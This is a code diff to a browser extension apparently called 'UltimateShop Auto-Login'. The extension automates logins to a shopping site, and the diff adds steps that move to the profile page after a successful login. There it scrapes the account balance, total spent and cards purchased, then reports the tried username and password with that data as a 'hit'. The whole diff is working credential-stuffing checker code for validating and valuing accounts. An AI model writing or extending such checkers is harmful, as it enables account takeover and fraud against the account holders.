@@ -16,9 +16,62 @@ function isSuccessPage() {
            document.body.textContent.includes('Discount :');
 }
 
-// Check if we're on the profile/dashboard page
+// Check if we're on the profile page
 function isProfilePage() {
-    return isSuccessPage(); // Only use the 2 indicators you specified
+    return window.location.href.includes('/profile');
+}
+
+// Extract balance and stats from profile page
+function extractProfileData() {
+    try {
+        // Extract Current Balance
+        const balanceRow = Array.from(document.querySelectorAll('td')).find(td => 
+            td.textContent.trim() === 'Current balance:'
+        );
+        let balance = '0.00';
+        if (balanceRow && balanceRow.nextElementSibling) {
+            balance = balanceRow.nextElementSibling.textContent.trim();
+        }
+
+        // Extract Total Spent
+        const spentRow = Array.from(document.querySelectorAll('td')).find(td => 
+            td.textContent.trim() === 'Total spent:'
+        );
+        let totalSpent = '0';
+        if (spentRow && spentRow.nextElementSibling) {
+            totalSpent = spentRow.nextElementSibling.textContent.trim();
+        }
+
+        // Extract Cards Purchased
+        const cardsRow = Array.from(document.querySelectorAll('td')).find(td => 
+            td.textContent.trim() === 'Cards purchased:'
+        );
+        let cardsPurchased = '0';
+        if (cardsRow && cardsRow.nextElementSibling) {
+            cardsPurchased = cardsRow.nextElementSibling.textContent.trim();
+        }
+
+        return {
+            balance: balance,
+            totalSpent: totalSpent,
+            cardsPurchased: cardsPurchased
+        };
+    } catch (error) {
+        console.error('Error extracting profile data:', error);
+        return {
+            balance: '0.00',
+            totalSpent: '0',
+            cardsPurchased: '0'
+        };
+    }
+}
+
+// Navigate to profile page after successful login
+function navigateToProfile() {
+    if (window.location.href.includes('/news')) {
+        console.log('UltimateShop Auto-Login: Navigating to profile page...');
+        window.location.href = 'https://ultimateshop.vc/profile';
+    }
 }
 
 // Get the error message from the page
@@ -160,15 +213,24 @@ function handlePage() {
             performLoginAutomation();
         }
     } else if (isSuccessPage()) {
-        console.log('UltimateShop Auto-Login: Login successful! Found "Discount:" text on /news page.');
+        console.log('UltimateShop Auto-Login: Login successful! Navigating to profile...');
+        // Navigate to profile page after successful login
+        setTimeout(navigateToProfile, 2000);
+    } else if (isProfilePage()) {
+        console.log('UltimateShop Auto-Login: On profile page, extracting data...');
         const username = sessionStorage.getItem('current_username');
         const password = sessionStorage.getItem('current_password');
         if (username && password) {
+            const profileData = extractProfileData();
+            console.log('UltimateShop Auto-Login: Profile data extracted:', profileData);
+            
             chrome.runtime.sendMessage({
                 type: 'hit_detected',
                 username,
                 password,
-                // You can add more data extraction here if needed
+                balance: profileData.balance,
+                totalSpent: profileData.totalSpent,
+                cardsPurchased: profileData.cardsPurchased
             });
             sessionStorage.removeItem('current_username');
             sessionStorage.removeItem('current_password');
